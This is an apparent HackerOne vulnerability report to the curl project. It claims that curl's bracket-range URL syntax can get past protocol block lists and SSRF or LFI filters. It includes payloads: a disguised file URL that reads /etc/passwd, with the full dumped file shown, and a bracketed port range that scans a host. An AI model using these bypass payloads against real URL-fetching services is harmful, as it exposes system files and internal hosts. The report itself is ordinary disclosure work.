# error parse uri path in curl

## Report Details
- **Report ID**: 1566462
- **URL**: https://hackerone.com/reports/1566462
- **State**: Closed
- **Severity**: high
- **Submitted**: 2022-05-12T06:20:27.886Z
- **Disclosed**: 2022-05-13T20:34:41.536Z

## Reporter
- **Username**: iylz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: curl

## Vulnerability Information
## Summary:
[add summary of the vulnerability]

The uri path error could lead to security filter bypasses. 
For example, 
we can use  curl  -vv 'f[h-j]le:///etc/passwd' to bypass  file protocol  black list
we can use  curl  -vv 'http://1.1.1.1:[80-9000]' to scan the open port in the host
etc ...

## Steps To Reproduce:
[add details for how we can reproduce the issue]

curl -vv 'f[h-j]le:///etc/passwd' will  parse 3 request , like  curl -vv 'fhle:///etc/passwd' 、curl -vv 'file:///etc/passwd' 、curl -vv 'fjle:///etc/passwd' 
```
[root@iz2ze9awqx4bwtc7j5q4hsz bin]# ./curl -Version
curl 7.83.1 (x86_64-pc-linux-gnu) libcurl/7.83.1 zlib/1.2.7
Release-Date: 2022-05-11
Protocols: dict file ftp gopher http imap mqtt pop3 rtsp smtp telnet tftp 
Features: alt-svc AsynchDNS IPv6 Largefile libz UnixSockets
[root@iz2ze9awqx4bwtc7j5q4hsz bin]# ./curl -vv 'f[h-j]le:///etc/passwd'
* Protocol "fhle" not supported or disabled in libcurl
* Closing connection -1
curl: (1) Protocol "fhle" not supported or disabled in libcurl
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-bus-proxy:x:999:998:systemd Bus Proxy:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:998:997:User for polkitd:/:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:997:995::/var/lib/chrony:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
admin:x:1000:1000::/home/admin:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
postgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/sbin/nologin
squid:x:23:23::/var/spool/squid:/sbin/nologin
workftp:x:1002:1003::/home/work/ftp/:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
* Closing connection 0
* Protocol "fjle" not supported or disabled in libcurl
* Closing connection -1
curl: (1) Protocol "fjle" not supported or disabled in libcurl
[root@iz2ze9awqx4bwtc7j5q4hsz bin]# wget 'f[h-j]le:///etc/passwd'
f[h-j]le:///etc/passwd: 地址缺少协议类型.
[root@iz2ze9awqx4bwtc7j5q4hsz bin]# 
```

So, I think this is a security questions of  curl, because the wget doesn't have same question. Thinks 

## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

  * [attachment / reference]

## Impact

bypass the security filter like the SSRF/RFL/LFI  etc.

## Attachments
- 1.png
